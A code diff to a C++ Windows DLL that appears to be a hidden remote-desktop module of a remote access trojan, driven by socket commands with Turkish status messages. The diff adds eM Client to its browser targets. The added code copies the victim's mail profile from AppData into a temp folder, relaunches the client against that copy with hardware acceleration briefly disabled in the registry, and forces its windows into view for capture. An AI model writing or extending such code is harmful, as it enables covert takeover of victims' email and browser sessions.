@@ -249,6 +249,46 @@ static bool patch_cursor_info(DWORD pid) {
 }
 
 static vector<DWORD> g_patchedPids;
+static atomic<DWORD> g_emClientPid(0);
+
+struct RegBackup {
+    bool hasBackup = false;
+    DWORD originalValue = 0;
+};
+
+static RegBackup g_avalonBackup;
+
+static void set_hw_acceleration_disabled() {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Avalon.Graphics";
+    g_avalonBackup.hasBackup = false;
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD type = 0;
+        DWORD data = 0;
+        DWORD size = sizeof(data);
+        if (RegQueryValueExW(hKey, L"DisableHWAcceleration", NULL, &type, (LPBYTE)&data, &size) == ERROR_SUCCESS) {
+            g_avalonBackup.hasBackup = true;
+            g_avalonBackup.originalValue = data;
+        }
+        DWORD val = 1;
+        RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
+        RegCloseKey(hKey);
+    }
+}
+
+static void restore_hw_acceleration() {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Avalon.Graphics";
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
+        if (g_avalonBackup.hasBackup) {
+            DWORD val = g_avalonBackup.originalValue;
+            RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
+        } else {
+            RegDeleteValueW(hKey, L"DisableHWAcceleration");
+        }
+        RegCloseKey(hKey);
+    }
+}
 
 static void patch_all_opera_processes() {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -944,6 +984,23 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+
+                DWORD pid = 0;
+                GetWindowThreadProcessId(hwnd, &pid);
+                DWORD targetPid = g_emClientPid.load();
+                if (targetPid != 0 && pid == targetPid) {
+                    wchar_t title[256] = {0};
+                    GetWindowTextW(hwnd, title, 256);
+                    LONG style = GetWindowLongW(hwnd, GWL_STYLE);
+                    HWND owner = GetWindow(hwnd, GW_OWNER);
+                    if (wcslen(title) > 0 && (style & WS_CAPTION) && owner == NULL) {
+                        if (IsIconic(hwnd) || !IsWindowVisible(hwnd)) {
+                            ShowWindow(hwnd, SW_RESTORE);
+                            SetForegroundWindow(hwnd);
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -2122,6 +2179,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_inputThread.joinable())   g_inputThread.join();
             if (g_patchThread.joinable())   g_patchThread.join();
             g_patchedPids.clear();
+            g_emClientPid = 0;
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -2156,7 +2214,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2237,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2225,6 +2285,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             } else if (wRequestedPath == L"Thunderbird") {
                                 exePath = L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
                                 if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
+                            } else if (wRequestedPath == L"eM Client") {
+                                exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
                             }
                         }
                     }
@@ -2275,7 +2338,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
 
                     } else if (copyProfile) {
-                        wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                        wstring sourceUserData;
+                        if (wRequestedPath == L"eM Client") {
+                            wchar_t appData[MAX_PATH];
+                            if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData) == S_OK) {
+                                sourceUserData = wstring(appData) + L"\\eM Client";
+                            }
+                        } else {
+                            sourceUserData = get_browser_profile_path(wRequestedPath);
+                        }
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("User Data directory not found.");
@@ -2303,18 +2374,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             return;
                         }
 
-                        WIN32_FIND_DATAW findData;
-                        HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
-                        if (hFind != INVALID_HANDLE_VALUE) {
-                            do {
-                                wstring name = findData.cFileName;
-                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                    profileDir = name;
-                                    break;
-                                }
-                            } while (FindNextFileW(hFind, &findData));
-                            FindClose(hFind);
+                        if (wRequestedPath != L"eM Client") {
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    wstring name = findData.cFileName;
+                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                        (name == L"Default" || name.find(L"Profile ") == 0)) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
                         }
                         profilePath = tempProfileRoot;
                     }
@@ -2343,6 +2416,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        if (copyProfile && !profilePath.empty()) {
+                            args = L" /dblocation \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2430,7 +2507,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
-                            } else {
+                            } else if (wRequestedPath != L"eM Client") {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
                                 fs::remove(fs::path(profilePath) / L"SingletonCookie");
@@ -2463,8 +2540,21 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
-                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
+                    if (wRequestedPath == L"eM Client") {
+                        set_hw_acceleration_disabled();
+                    }
+
+                    BOOL cpResult = CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                                   0, NULL, NULL, &si, &pi);
+
+                    if (wRequestedPath == L"eM Client") {
+                        restore_hw_acceleration();
+                    }
+
+                    if (cpResult) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_emClientPid = pi.dwProcessId;
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
